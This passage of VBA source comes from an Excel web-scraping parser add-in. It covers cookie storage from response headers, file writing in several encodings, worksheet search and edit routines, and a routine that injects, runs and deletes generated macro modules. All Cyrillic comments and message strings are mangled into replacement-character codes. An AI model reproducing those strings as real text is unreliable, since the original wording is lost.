        GetTextFromSheet = GetTextFromSheet & NewValue$
    Next
End Function

Sub DeleteAllHiddenNames(ByRef sh As Worksheet)
    On Error Resume Next: Dim n As Name
    For Each n In sh.Names
        If Not n.Visible Then n.Delete
    Next
End Sub

Sub ShowParserDescriptionAtWebsite()
    On Error Resume Next
    ShowParserDescription_ExcelVBA AllParsers.GetActiveParser.GetHTMLdescription
End Sub

Sub ShowParserDescription_ExcelVBA(ByVal txt$)
    On Error Resume Next
    Dim UpdateFolder$, FileName$, FSO As Object, ts As Object, link$
    UpdateFolder$ = "resources/" & PROJECT_NAME$ & "/"
    FileName$ = FWF.temp_filename
    
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(FileName$, True, True)
    ts.Write txt$: ts.Close
    Set ts = Nothing: Set FSO = Nothing
    ChangeFileCharset FileName$, "utf-8"
    
    link$ = Application.Run("'CommonFunctions.xla'!Publish_Update", PROJECT_NAME$, _
        UpdateFolder$, FileName$, "test.html")
    'Debug.Print Now, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Link$
    CreateObject("wscript.shell").Run "http://ExcelVBA.ru/programmes/Parser/samples/test"
End Sub

Sub ShowParserDescriptionAtLocalhost(Optional ByVal Content$, Optional ByVal AddDownloadLink As Boolean = False)
    On Error Resume Next
    Dim txt$, css$, FileName$, FSO As Object, ts As Object
    
    If Len(Content$) Then
        FileName$ = FWF.temp_folder & "actions_" & CLng(Now * 10000) & ".html"
        'If AddDownloadLink Then content$ = content$ & "<a download href=""file:///" & filename$ & """>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|</a>"
        If AddDownloadLink Then Content$ = Content$ & "<a class=""parser-download-actions-list"" download href="""">|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| HTML</a>"
    Else
        Content$ = AllParsers.GetActiveParser.GetHTMLdescription
        FileName$ = FWF.temp_folder & "parser_algorithm__" & Replace(CURRENT_PARSER$, " ", "_") & "_" & CLng(Now * 10000) & ".html"
    End If
    
    css$ = "<link type=""text/css"" rel=""stylesheet"" href=""http://ExcelVBA.ru/themes/excelvba/parser.css"" />"
    txt$ = "<html>" & vbNewLine & "<head>" & vbNewLine & css$ & "</head>" & vbNewLine & "<body>" & vbNewLine & _
        "<div class=""parser-container"">" & vbNewLine & Content$ & vbNewLine & "</div>" & vbNewLine & "</body>" & vbNewLine & "</html>"
    
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(FileName$, True, True)
    ts.Write txt$: ts.Close
    Set ts = Nothing: Set FSO = Nothing
    ChangeFileCharset FileName$, "utf-8"
    
    CreateObject("wscript.shell").Run FileName$
End Sub

Function SaveCookiesFromResponseHeaders(ByVal txt$, Optional ByVal FromIE As Boolean)
    On Error Resume Next
    Dim cookies$, item, param_name$, param_value$
    cookies$ = Replace(TextBetween(txt$, "Set-Cookie: ", vbNewLine), ARSEP, "; ")
    If CookiesStore Is Nothing Then Set CookiesStore = New Dictionary        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| cookies
    
    For Each item In Split(cookies$, "; ")
        param_name$ = "": param_value$ = ""
        param_name$ = Split(item, "=", 2)(0)
        param_value$ = Split(item, "=", 2)(1)
        
        If param_name$ = "expires" Then param_name$ = ""
        If param_name$ = "secure" Then param_name$ = ""
        If param_name$ = "path" Then param_name$ = ""
        If param_name$ = "HttpOnly" Then param_name$ = ""
        If param_name$ = "domain" Then param_name$ = ""
        If param_name$ = "Max-Age" Then param_name$ = ""
        
        If Len(param_name$) Then
            If param_value$ = "deleted" Then
                CookiesStore.Remove param_name$
                If TEST_ACTIONS_MODE Then AddBalloon "<span style='color:#900;'>Delete cookie</span>: <b>" & param_name$ & "</b>", bt_CookieDelete
            Else
                CookiesStore.item(param_name$) = param_value$
                If TEST_ACTIONS_MODE Then AddBalloon "<span style='color:#090;'>Set cookie</span>" & IIf(FromIE, " <span style='color:red;'>from IE</span>", "") & _
                    ": <b>" & param_name$ & "</b> = " & FormatTextForBalloon(param_value$, 70), bt_CookieAdd
            End If
        End If
    Next
    
    '            For Each key In CookiesStore.keys
    '                Debug.Print key, CookiesStore(key)
    '            Next
End Function

Function GetCookiesFromStore() As String
    On Error Resume Next: Dim key, v$
    For Each key In CookiesStore.Keys
        v$ = CookiesStore(key)
        GetCookiesFromStore = GetCookiesFromStore & "; " & key & IIf(v$ = "", "", "=" & v$)
    Next
    GetCookiesFromStore = Mid(GetCookiesFromStore, 3)
End Function

Function ShowInfo_CookiesListFromStore()
    On Error Resume Next: Dim key, v$, res$
    For Each key In CookiesStore.Keys
        If Len(CookiesStore(key)) > 60 Then
            v$ = Left(CookiesStore(key), 40) & " ... " & Right(CookiesStore(key), 20)
        Else
            v$ = CookiesStore(key)
        End If
        res$ = res$ & IIf(Len(res$) > 0, vbNewLine, "") & Chr(160) & "*" & Chr(160) & key & IIf(v$ = "", "", "=" & v$)
    Next
    ' res$ = Mid(res$, 3)
    
    If Len(res$) Then
        MsgBox res$, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies (" & CookiesStore.Count & " |fffd||fffd|.)"
    Else
        MsgBox "Cookies |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd| Cookies"
    End If
End Function

Function DeleteCookiesFromStore(ByVal Mask$) As String
    On Error Resume Next: Dim key, v
    For Each key In CookiesStore.Keys
        If key Like Mask$ Then
            v = CookiesStore(key)
            CookiesStore.Remove key
            If TEST_ACTIONS_MODE Then AddBalloon "Delete cookie by parser: " & key & " = " & v, bt_Attention
        End If
    Next
End Function

Function Arr2CSV(ByRef arr, Optional ByVal ColumnsSeparator$ = ";", _
        Optional ByVal RowsSeparator$ = vbNewLine, _
        Optional ByRef pi As Object) As String
    Dim buffer$, i&, n&, st&, txt$, j&
    buffer$ = ""        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    pi.SubActionsCount = 50: st& = Fix(UBound(arr, 1) / 50)
    For i = LBound(arr, 1) To UBound(arr, 1)
        If i Mod st = 0 Then n = n + 1: pi.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| CSV: " & _
            Format(Len(Arr2CSV) + Len(buffer$), "# ###") & " |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & 2 * n & "%"
        txt = "": For j = LBound(arr, 2) To UBound(arr, 2): txt = txt & ColumnsSeparator$ & arr(i, j): Next j
        Arr2CSV = Arr2CSV & Mid(txt, Len(ColumnsSeparator$) + 1) & RowsSeparator$
        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(Arr2CSV) > 50000 Then buffer$ = buffer$ & Arr2CSV: Arr2CSV = ""
    Next i
    Arr2CSV = buffer$ & Arr2CSV
End Function

Function SaveTextToFile(ByVal txt$, ByVal FileName$, Optional ByVal Encoding$ = "windows-1251") As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| txt |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Charset$ |fffd| |fffd||fffd||fffd||fffd| filename$
    On Error Resume Next: Err.Clear
    Dim FSO As FileSystemObject, ts As TextStream, binaryStream As Object
    
    Select Case Encoding$
        
        Case "windows-1251", "", "ansi"
            Set FSO = CreateObject("scripting.filesystemobject")
            Set ts = FSO.CreateTextFile(FileName, True)
            ts.Write txt
            ts.Close
            If Err Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                txt$ = StrConv(StrConv(txt, vbFromUnicode, &H419), vbUnicode, &H419)
                Err.Clear
                Set ts = FSO.CreateTextFile(FileName, True)
                ts.Write txt$: ts.Close
            End If
            Set ts = Nothing: Set FSO = Nothing
            
        Case "utf-16", "utf-16LE"
            Set FSO = CreateObject("scripting.filesystemobject")
            Set ts = FSO.CreateTextFile(FileName, True, True)
            ts.Write txt: ts.Close
            Set ts = Nothing: Set FSO = Nothing
            
        Case "utf-8noBOM"
            With CreateObject("ADODB.Stream")
                .Type = 2: .Charset = "utf-8": .Open
                .WriteText txt$
                
                Set binaryStream = CreateObject("ADODB.Stream")
                binaryStream.Type = 1: binaryStream.Mode = 3: binaryStream.Open
                .Position = 3: .CopyTo binaryStream        'Skip BOM bytes
                .flush: .Close
                binaryStream.SaveToFile FileName$, 2
                binaryStream.Close
            End With
            
        Case Else
            With CreateObject("ADODB.Stream")
                .Type = 2: .Charset = Encoding$: .Open
                .WriteText txt$
                .SaveToFile FileName$, 2        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                .Close
            End With
    End Select
    SaveTextToFile = Err = 0: DoEvents
End Function

Function SeparatorReplacement(ByVal sep$) As String
    Select Case sep$
        Case ";": SeparatorReplacement = ","
        Case ",": SeparatorReplacement = ";"
        Case vbTab: SeparatorReplacement = " "
        Case Else: SeparatorReplacement = ","
    End Select
End Function

Public Sub SetMacroReturnPoint(ByVal txt As Variant)
    On Error Resume Next: MacroReturnPoint = Fix(Val(txt))
End Sub

Sub FillExistingParsersList()
    On Error Resume Next
    Dim coll As Collection, FileName$, Folder$, short_folder$, arr, n&, item, website$
    Set coll = FWF.FilenamesCollection(ThisWorkbook.Path, "*.xlp")
    If coll.Count = 0 Then Exit Sub
    ReDim arr(1 To coll.Count, 1 To 3)
    For Each item In coll
        FileName$ = Dir(item): Folder$ = Left(item, InStrRev(item, "\"))
        short_folder$ = Replace(Folder$, ThisWorkbook.Path, "")
        
        website$ = Left(FileName$, InStrRev(FileName$, ".xlp") - 1)
        If (website$ Like "[1-3]. *") Or (website$ Like "[1-3] *") Then website$ = Trim(Split(website$, , 2)(1))
        If website$ Like "www.*" Then website$ = Trim(Split(website$, "www.", 2)(1))
        
        'Debug.Print website$ ', short_folder$
        n& = n& + 1
        arr(n, 1) = website$
        arr(n, 2) = short_folder$
        arr(n, 3) = CStr(item)
    Next
    
End Sub

Function ArrayToParserArray(ByRef arr, Optional ReplaceBlankWith$ = "") As String
    On Error Resume Next
    If Not IsArray(arr) Then ArrayToParserArray = IIf(arr = vbNullString, ReplaceBlankWith$, arr): Exit Function
    Dim i&, j&, txt$, buffer$, buffer2$, v$
    
    buffer$ = "": buffer2$ = "": Const BufferLen& = 15000
    For i = LBound(arr, 1) To UBound(arr, 1)
        txt = ""
        For j = LBound(arr, 2) To UBound(arr, 2)
            v$ = Replace(arr(i, j), "|", Chr(19))
            If v$ = vbNullString Then v$ = ReplaceBlankWith$
            txt = txt & "|" & v$
        Next j
        buffer$ = buffer$ & Mid(txt, 2) & ARSEP
        
        If Len(buffer$) > BufferLen& Then
            buffer2$ = buffer2$ & buffer$: buffer$ = ""
            If Len(buffer2$) > BufferLen& * 40 Then ArrayToParserArray = ArrayToParserArray & buffer2$: buffer2$ = ""                ': DoEvents
        End If
        
    Next i
    ArrayToParserArray = ArrayToParserArray & buffer2$ & buffer$
End Function

Function FindCellsEx(ByVal SearchRangeAddress$, ByVal SearchMask$, ByVal Offset$, _
        ByVal Action$, ByVal NewValue$, ByVal TargetMask$, Optional ReplaceBlankWith$ = "") As String
    On Error Resume Next
    Dim SearchRange As Range, addr$, v$, ra As Range, cell As Range, n&
    
    With ActiveSheet
        Set ra = .UsedRange
        Select Case Trim(SearchRangeAddress$)
            Case ""    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                
            Case "selection"
                .Parent.Activate
                .Activate
                Set ra = Intersect(Selection, ra)
                If (ra Is Nothing) And (Selection.Cells.Count < 1000) Then Set ra = Selection
                
            Case Else
                Set SearchRange = .Range(SearchRangeAddress$)
                If SearchRange Is Nothing Then Exit Function
                
                Set ra = Nothing: Set ra = Intersect(.Range(SearchRangeAddress$), .UsedRange)
                If (ra Is Nothing) And (SearchRange.Cells.Count < 1000) Then Set ra = SearchRange
        End Select
    End With
    If ra Is Nothing Then Exit Function
    
    If Action$ = "ReturnArray" Then
        FindCellsEx = ArrayToParserArray(ra.value, ReplaceBlankWith$)
        Exit Function
    End If
    
    
    ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set SearchRange = Nothing
    Select Case SearchMask$
        Case "*"
            ' |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Set SearchRange = ra
            
        Case Else
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Set SearchRange = FindAll(ra, SearchMask$)
            
    End Select
    If SearchRange Is Nothing Then Exit Function
    
    Dim OffsetRow&, OffsetCol&, ResizeRows&, ResizeCols&
    Dim destCell As Range, NewValueContainsCode As Boolean, NewValueOriginal$, code$
    
    NewValueContainsCode = NewValue$ Like "*{?*}*"
    
    Offset$ = Replace(Replace(Offset$, " ", ""), ",", ";")
    OffsetRow& = Val(Split(Offset$, ";")(0))
    OffsetCol& = Val(Split(Offset$, ";")(1))
    
    ResizeRows& = Val(Split(Offset$, ";")(2))
    ResizeCols& = Val(Split(Offset$, ";")(3))
    If ResizeRows& <= 0 Then ResizeRows& = 1
    If ResizeCols& <= 0 Then ResizeCols& = 1
    
    Dim ar As Range, destRange As Range
    If (Action$ Like "Set*") And (TargetMask$ = "*") And Not NewValueContainsCode Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each ar In SearchRange.Areas
            Set destRange = Nothing:  Set destRange = ar.Offset(OffsetRow&, OffsetCol&)
            Set destRange = destRange.Resize(destRange.Rows.Count + ResizeRows& - 1, destRange.Columns.Count + ResizeCols& - 1)
            
            With destRange
                Select Case Action$
                    Case "SetValue"
                        .FormulaR1C1Local = NewValue$
                    Case "SetHyperlink"
                        .Hyperlinks.Add destRange, NewValue$
                    Case "SetComment"
                        .NoteText NewValue$
                    Case "SetInteriorColor"
                        If NewValue$ = "" Then .Interior.ColorIndex = xlColorIndexNone Else .Interior.Color = Val(NewValue$)
                    Case "SetFontColor"
                        If NewValue$ = "" Then .Font.ColorIndex = xlColorIndexAutomatic Else .Font.Color = Val(NewValue$)
                    Case "SetFontBold"
                        If NewValue$ = "" Then .Font.Bold = True Else .Font.Bold = CBool(NewValue$)
                End Select
            End With
        Next ar
        Exit Function
    End If
    
    If (Action$ = "GetValue") And (TargetMask$ = "*") Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each ar In SearchRange.Areas
            Set destRange = Nothing:  Set destRange = ar.Offset(OffsetRow&, OffsetCol&)
            Set destRange = destRange.Resize(destRange.Rows.Count + ResizeRows& - 1, destRange.Columns.Count + ResizeCols& - 1)
            
            'Debug.Print destRange.Address
            FindCellsEx = FindCellsEx & ArrayToParserArray(destRange.value, ReplaceBlankWith$) & ARSEP
        Next ar
        FindCellsEx = Left(FindCellsEx, Len(FindCellsEx) - Len(ARSEP))
        Exit Function
    End If
    
    
    NewValueOriginal$ = NewValue$
    
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    For Each cell In SearchRange.Cells
        DoEvents: n = n + 1
        If StopMacro Then Exit For
        
        Set destRange = Nothing: Set destRange = cell.Offset(OffsetRow&, OffsetCol&)
        Set destRange = destRange.Resize(ResizeRows&, ResizeCols&)
        
        For Each destCell In destRange.Cells
            With destCell
                If .value Like TargetMask$ Then
                    
                    If NewValueContainsCode Then
                        NewValue$ = NewValueOriginal$
                        code$ = "{FoundCell}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, cell.value)
                        code$ = "{FoundCell.Text}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, cell.text)
                        code$ = "{FoundCell.URL}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, GetCellHyperlinkAddress(cell, True))
                        code$ = "{FoundCell.Comment}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, cell.NoteText)
                        code$ = "{FoundCell.Address}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, cell.Address(0, 0))
                        code$ = "{FoundCell.Row}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, cell.row)
                        
                        code$ = "{TargetCell}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, .value)
                        code$ = "{TargetCell.Text}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, .text)
                        code$ = "{TargetCell.URL}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, GetCellHyperlinkAddress(destCell, True))
                        code$ = "{TargetCell.Comment}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, .NoteText)
                        code$ = "{TargetCell.Address}": If InStr(1, NewValue$, code$, vbTextCompare) Then NewValue$ = Replace(NewValue$, code$, .Address(0, 0))
                        
                    End If
                    
                    v$ = ""
                    Select Case Action$
                        
                        Case "GetValue"
                            v = .value
                            If v$ = vbNullString Then v$ = ReplaceBlankWith$
                            FindCellsEx = FindCellsEx & v & ARSEP
                            
                        Case "GetHyperlink"
                            v = GetCellHyperlinkAddress(destCell, True)
                            If v$ = vbNullString Then v$ = ReplaceBlankWith$
                            FindCellsEx = FindCellsEx & v & ARSEP
                            
                        Case "GetComment"
                            v = .NoteText
                            If v$ = vbNullString Then v$ = ReplaceBlankWith$
                            FindCellsEx = FindCellsEx & v & ARSEP
                            
                        Case "SetValue"
                            .FormulaR1C1Local = NewValue$
                            
                        Case "SetHyperlink"
                            .Hyperlinks.Add destCell, NewValue$
                            
                        Case "SetComment"
                            .NoteText NewValue$
                            
                        Case "SetInteriorColor"
                            If NewValue$ = "" Then .Interior.ColorIndex = xlColorIndexNone Else .Interior.Color = Val(NewValue$)
                            
                        Case "SetFontColor"
                            If NewValue$ = "" Then .Font.ColorIndex = xlColorIndexAutomatic Else .Font.Color = Val(NewValue$)
                            
                        Case "SetFontBold"
                            If NewValue$ = "" Then .Font.Bold = True Else .Font.Bold = CBool(NewValue$)
                            
                    End Select
                End If
            End With
        Next destCell
    Next cell
End Function


Function FindCellsOnSheet(ByVal What As String, SearchRangeAddress$, SearchMask$, Optional ByVal AddCellAddress As Boolean) As String
    On Error Resume Next
    Dim SearchRange As Range, addr$, v$, ra As Range, cell As Range, n&
    With ActiveSheet
        Set ra = .UsedRange
        Select Case Trim(SearchRangeAddress$)
            Case ""    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Case "selection"
                .Parent.Activate
                .Activate
                Set ra = Intersect(Selection, ra)
            Case Else
                Set SearchRange = .Range(SearchRangeAddress$)
                If Not SearchRange Is Nothing Then Set ra = SearchRange
        End Select
    End With
    If ra Is Nothing Then Exit Function
    
    Set ra = SpecialCells_VisibleRows(ra)
    If ra Is Nothing Then Exit Function
    
    For Each cell In ra.Cells
        DoEvents: n = n + 1
        If StopMacro Then Exit For
        
        v$ = ""
        Select Case Val(What)
            Case ft_Value
                v = cell.value
            Case ft_Hyperlink
                v = GetCellHyperlinkAddress(cell, True)
            Case ft_Comment
                v = cell.NoteText
        End Select
        
        If v Like SearchMask$ Then
            FindCellsOnSheet = FindCellsOnSheet & IIf(AddCellAddress, cell.Address(0, 0) & "|" & v, v) & ARSEP
        End If
    Next cell
End Function


Function FindAll(SearchRange As Range, FindWhat As Variant) As Range
    
    Dim FoundCell As Range, FirstFound As Range, LastCell As Range, rngResultRange As Range
    Dim Area As Range, MaxRow As Long, MaxCol As Long
    
    ' this loop in Areas is to find the last cell of all the areas. That is, the cell whose row
    ' and column are greater than or equal to any cell in any Area.
    For Each Area In SearchRange.Areas
        With Area
            If .Cells(.Cells.Count).row > MaxRow Then MaxRow = .Cells(.Cells.Count).row
            If .Cells(.Cells.Count).Column > MaxCol Then MaxCol = .Cells(.Cells.Count).Column
        End With
    Next Area
    Set LastCell = SearchRange.Worksheet.Cells(MaxRow, MaxCol)
    Set FoundCell = SearchRange.Find(What:=FindWhat, After:=LastCell, LookIn:=xlValues, LookAt:=xlWhole, SearchOrder:=xlByRows, MatchCase:=False)
    
    If Not FoundCell Is Nothing Then
        Set FirstFound = FoundCell
        Do Until False    ' Loop forever. We'll "Exit Do" when necessary.
            
            If rngResultRange Is Nothing Then
                Set rngResultRange = FoundCell
            Else
                Set rngResultRange = Application.Union(rngResultRange, FoundCell)
            End If
            
            Set FoundCell = SearchRange.FindNext(After:=FoundCell)
            If (FoundCell Is Nothing) Then Exit Do
            If (FoundCell.Address = FirstFound.Address) Then Exit Do
        Loop
    End If
    Set FindAll = rngResultRange
End Function


Function WindowsClipboard_GetText() As String
    On Error Resume Next
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        WindowsClipboard_GetText = .GetText
    End With
End Function

Function WindowsClipboard_SetText(ByVal txt$, Optional ByVal MaxAttempts& = 5) As Long
    On Error Resume Next: Dim res$, Attempts&, OK As Boolean
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        Do
            .SetText txt$
            .PutInClipboard
            
            .GetFromClipboard
            res$ = .GetText
            Attempts& = Attempts& + 1
            OK = res$ = txt$
        Loop While (Not OK) And (Attempts& <= MaxAttempts&)
    End With
    If OK Then WindowsClipboard_SetText = Attempts&
End Function

Sub SortCollection(ByRef coll As Collection)
    On Error Resume Next
    Dim vItm As Variant, i As Long, j As Long, vTemp As Variant
    
    'Two loops to bubble sort
    For i = 1 To coll.Count - 1
        For j = i + 1 To coll.Count
            If UCase(coll(i)) > UCase(coll(j)) Then
                'store the lesser item
                vTemp = coll(j)
                'remove the lesser item
                coll.Remove j
                're-add the lesser item before the greater Item
                coll.Add vTemp, vTemp, i
            End If
        Next j
    Next i
End Sub

Attribute VB_Name = "mod_Macro"
'---------------------------------------------------------------------------------------
' Module        : mod_Macro                    Version:
' Author        : Igor Vakhnenko                   Date: 19.02.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text: Option Private Module

Sub AddMacroToWorkbook(ByVal code$, Optional ByRef WB As Workbook, Optional RunMacro$, _
                       Optional DeleteMacroWhenDone As Boolean = False, Optional ModuleName$ = "00")
    'Dim VBProj As VBProject, VBComp As VBComponent, CodeMod As CodeModule

    On Error Resume Next
    If WB Is Nothing Then Set WB = ActiveWorkbook
    If WB Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub

    Set VBProj = WB.VBProject
    If VBProj Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| VBA", vbExclamation: Exit Sub

    Dim mod_name$, CleanMacroname$, MacroParam$
    mod_name$ = "pm_" & Left(ModuleName$, 2) & "_" & Left(Get_MD5_Hash(code$), 24)
    Set VBComp = VBProj.VBComponents.item(mod_name$)

    If VBComp Is Nothing Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        Set VBComp = VBProj.VBComponents.Add(1)        ' vbext_ct_StdModule=1
        VBComp.Name = mod_name$
        If VBComp Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| VBA, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub
        Set CodeMod = VBComp.CodeModule
        CodeMod.AddFromString code$
    End If

    If Len(Trim(RunMacro$)) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        CleanMacroname$ = Split(Trim(RunMacro$), " ")(0)
        MacroParam$ = "": MacroParam$ = Trim(Split(Trim(RunMacro$), " ", 2)(1))

        CleanMacroname$ = "'" & WB.Name & "'!" & CleanMacroname$
        If Len(MacroParam$) > 0 Then Run CleanMacroname$, MacroParam$ Else Run CleanMacroname$
    End If

    If DeleteMacroWhenDone Then DeleteMacroModules WB, mod_name$

    Err.Clear
End Sub

Sub DeleteMacroModules(Optional ByRef WB As Workbook, Optional ModuleNameMask$ = "*")
    On Error Resume Next
    If WB Is Nothing Then Set WB = ActiveWorkbook
